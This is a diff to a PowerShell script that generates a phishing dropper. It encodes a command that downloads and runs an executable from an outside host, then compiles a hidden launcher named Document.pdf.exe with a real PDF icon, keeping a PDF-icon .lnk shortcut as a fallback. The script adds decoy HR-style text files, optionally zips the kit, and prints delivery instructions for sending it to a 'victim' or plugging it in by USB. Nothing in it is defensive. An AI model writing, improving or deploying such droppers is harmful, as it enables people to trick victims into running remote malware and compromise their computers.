@@ -3,7 +3,6 @@ param(
     [switch]$Zip
 )
 
-# Generate the base64-encoded one-liner
 $rawCmd = "iwr 'https://allseeing.netlify.app/a' -OutFile `$env:tmp\a.exe; start `$env:tmp\a.exe"
 $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
 $encCmd = [Convert]::ToBase64String($encBytes)
@@ -13,85 +12,102 @@ if (!$Path) {
     if (!$Path) { Write-Error "No path provided"; exit 1 }
 }
 
-# Resolve full path
 $Path = [IO.Path]::GetFullPath($Path)
 if (!(Test-Path $Path)) { Write-Error "Path does not exist: $Path"; exit 1 }
 
 Write-Output "Generating payload in: $Path"
 
-# Create LNK shortcut
-$shell = New-Object -ComObject WScript.Shell
-$lnk = $shell.CreateShortcut("$Path\Document.pdf.lnk")
-$lnk.TargetPath = "powershell.exe"
-$lnk.Arguments = "-w h -Enc $encCmd"
-$lnk.WorkingDirectory = "%TEMP%"
-$lnk.WindowStyle = 7
+# --- Extract PDF icon ---
+$tmpDir = "$env:TEMP\netpen_icon_$(Get-Random)"
+New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
 
-# Set PDF icon - query registry for the real PDF handler icon
-$pdfIcon = $null
-try {
-    $progId = (Get-ItemProperty "Registry::HKEY_CLASSES_ROOT\.pdf" -Name "(default)" -ErrorAction Stop)."(default)"
-    if ($progId) {
-        $iconLine = (Get-ItemProperty "Registry::HKEY_CLASSES_ROOT\$progId\DefaultIcon" -Name "(default)" -ErrorAction SilentlyContinue)."(default)"
-        if ($iconLine) { $pdfIcon = $iconLine }
-    }
-} catch {}
+$tempPdf = "$tmpDir\_.pdf"
+Set-Content $tempPdf "%PDF-1.4" -Encoding Ascii
 
-# Fallback: check common PDF readers
-if (!$pdfIcon) {
-    $pdfPaths = @(
-        "C:\Program Files\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe, 0",
-        "C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe, 0",
-        "C:\Program Files\Adobe\Reader 11.0\Reader\AcroRd32.exe, 0",
-        "C:\Program Files (x86)\Adobe\Reader 11.0\Reader\AcroRd32.exe, 0",
-        "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe, 4",
-        "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, 4",
-        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe, 4",
-        "C:\Program Files\Google\Chrome\Application\chrome.exe, 4"
-    )
-    foreach ($entry in $pdfPaths) {
-        $exe = ($entry -split ",")[0]
-        if (Test-Path $exe) { $pdfIcon = $entry; break }
-    }
+Add-Type -AssemblyName System.Drawing
+$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($tempPdf)
+$icoPath = "$tmpDir\pdf.ico"
+$fs = New-Object System.IO.FileStream($icoPath, [System.IO.FileMode]::Create)
+$icon.Save($fs)
+$fs.Close()
+$icon.Dispose()
+Remove-Item $tempPdf -Force
+Write-Output "  [+] PDF icon extracted"
+
+# --- Create launcher.rc ---
+Set-Content "$tmpDir\launcher.rc" '101 ICON "pdf.ico"' -Encoding Ascii
+
+# --- Create launcher.cpp ---
+$cpp = '#include <windows.h>'
+$cpp += "`r`nint WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {"
+$cpp += "`r`n    WinExec(`"powershell -w h -Enc $encCmd`", SW_HIDE);"
+$cpp += "`r`n    return 0;"
+$cpp += "`r`n}"
+Set-Content "$tmpDir\launcher.cpp" $cpp -Encoding Ascii
+
+# --- Compile ---
+$oldPath = $env:Path
+$env:Path = "C:\msys64\ucrt64\bin;" + $env:Path
+$compile = windres "$tmpDir\launcher.rc" -O coff -o "$tmpDir\launcher.res" 2>&1
+if ($LASTEXITCODE -eq 0) {
+    g++ -Os -s -mwindows "$tmpDir\launcher.cpp" "$tmpDir\launcher.res" -o "$Path\Document.pdf.exe" 2>&1
+    Remove-Item "$tmpDir\launcher.res" -Force
+}
+$env:Path = $oldPath
+
+if ($LASTEXITCODE -ne 0) {
+    Write-Error "Compilation failed - g++ may not be installed"
+    $shell = New-Object -ComObject WScript.Shell
+    $lnk = $shell.CreateShortcut("$Path\Document.pdf.lnk")
+    $lnk.TargetPath = "powershell.exe"
+    $lnk.Arguments = "-w h -Enc $encCmd"
+    $lnk.WorkingDirectory = "%TEMP%"
+    $lnk.WindowStyle = 7
+    $lnk.IconLocation = "%SystemRoot%\system32\shell32.dll, 70"
+    $lnk.Save()
+    Write-Output "  [+] Document.pdf.lnk created (fallback)"
+} else {
+    Write-Output "  [+] Document.pdf.exe compiled"
 }
 
-# Ultimate fallback: shell32.dll document icon
-if (!$pdfIcon) { $pdfIcon = "%SystemRoot%\system32\shell32.dll, 70" }
+# Clean up temp
+Remove-Item "$tmpDir\launcher.cpp" -Force -ErrorAction SilentlyContinue
+Remove-Item "$tmpDir\launcher.rc" -Force -ErrorAction SilentlyContinue
+Remove-Item $icoPath -Force -ErrorAction SilentlyContinue
+Remove-Item $tmpDir -Force -ErrorAction SilentlyContinue
 
-$lnk.IconLocation = $pdfIcon
-$lnk.Save()
-Write-Output "  [+] Document.pdf.lnk (icon: $pdfIcon)"
-
-# Create decoy Document.txt
-@"
-This document contains confidential information.
-For authorized personnel only.
-
-Please review and sign the attached agreement.
-"@ | Set-Content "$Path\Document.txt" -Encoding UTF8
+# Decoy Document.txt
+Set-Content "$Path\Document.txt" "This document contains confidential information.`r`nFor authorized personnel only.`r`n`r`nPlease review and sign the attached agreement." -Encoding UTF8
 Write-Output "  [+] Document.txt created"
 
-# Create decoy README.txt
-@"
-Thank you for reviewing this document.
-Please ensure all sections are completed
-before the deadline.
-
-If you have any questions, contact the HR department.
-"@ | Set-Content "$Path\README.txt" -Encoding UTF8
+# Decoy README.txt
+Set-Content "$Path\README.txt" "Thank you for reviewing this document.`r`nPlease ensure all sections are completed`r`nbefore the deadline.`r`n`r`nIf you have any questions, contact the HR department." -Encoding UTF8
 Write-Output "  [+] README.txt created"
 
-# Optional: zip the payload
+# Optional zip
 if ($Zip) {
+    $zipFiles = @()
+    foreach ($f in @("Document.pdf.exe", "Document.pdf.lnk", "Document.txt", "README.txt")) {
+        $fp = "$Path\$f"
+        if (Test-Path $fp) { $zipFiles += $fp }
+    }
     $zipPath = "$Path\Document.zip"
     if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
-    Compress-Archive -Path "$Path\Document.pdf.lnk", "$Path\Document.txt", "$Path\README.txt" -DestinationPath $zipPath -CompressionLevel Optimal
-    Write-Output "  [+] Document.zip created"
+    if ($zipFiles.Count -gt 0) {
+        Compress-Archive -Path $zipFiles -DestinationPath $zipPath -CompressionLevel Optimal
+        Write-Output "  [+] Document.zip created"
+    }
 }
 
 Write-Output ""
 Write-Output "=== DELIVERY SUMMARY ==="
 Write-Output "Folder: $Path"
-Write-Output "Send the zip, or plug this USB into the target"
-Write-Output "Victim sees: Document.pdf   (clicks it -> payload fires)"
+if (Test-Path "$Path\Document.pdf.exe") {
+    Write-Output "Payload: Document.pdf.exe (no arrow, real PDF icon)"
+    Write-Output "Victim sees: Document.pdf (clicks it -> payload fires)"
+} elseif (Test-Path "$Path\Document.pdf.lnk") {
+    Write-Output "Payload: Document.pdf.lnk (PDF icon, has shortcut arrow)"
+    Write-Output "Victim sees: Document.pdf (shortcut)"
+}
+if ($Zip -and (Test-Path "$Path\Document.zip")) { Write-Output "Zipped: Document.zip" }
 Write-Output "=========================="
